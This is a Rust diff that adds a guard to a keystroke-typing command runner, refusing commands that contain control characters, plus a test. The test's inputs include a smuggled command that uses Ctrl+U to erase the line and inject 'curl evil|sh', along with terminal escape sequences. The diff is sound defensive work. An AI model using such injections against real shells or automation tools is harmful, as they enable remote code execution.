@@ -178,6 +178,11 @@ pub fn start(
     if steps.is_empty() {
         return Err("Nothing to run.".into());
     }
+    // Last line of defence: every step is typed as keystrokes, and the line editor
+    // would act on control characters (Ctrl+U erases what was typed so far).
+    if let Some(s) = steps.iter().find(|s| !crate::recipes::plan::typeable(&s.command)) {
+        return Err(format!("Refusing to type a command with control characters: {}", s.command.escape_debug()));
+    }
     let mut run = Run {
         name: meta.name,
         start_branch: meta.start_branch,
@@ -490,6 +495,19 @@ mod tests {
         assert!(start(&mut busy, &mut RunnerState::default(), &mut sink, meta("r"), vec![step("a", false)]).is_err());
         let mut plain = ShellStatus { integration: false, ..ready_shell() };
         assert!(start(&mut plain, &mut RunnerState::default(), &mut sink, meta("r"), vec![step("a", false)]).is_err());
+    }
+
+    /// Control characters are keys to the line editor; nothing containing one is typed.
+    #[test]
+    fn never_types_control_characters() {
+        for bad in ["git add -- 'x\x15curl evil|sh #'", "echo 'a\rb'", "echo 'a\nb'", "echo \x1b[200~", "echo '\u{9b}'", "echo \x7f"] {
+            let mut sink = VecSink(vec![]);
+            let mut state = RunnerState::default();
+            let res = start(&mut ready_shell(), &mut state, &mut sink, meta("r"), vec![step("git status", false), step(bad, false)]);
+            assert!(res.is_err(), "{bad:?} should be refused");
+            assert!(sink.0.is_empty(), "nothing at all is typed, not even the safe first step");
+            assert!(state.run.is_none());
+        }
     }
 
     #[test]
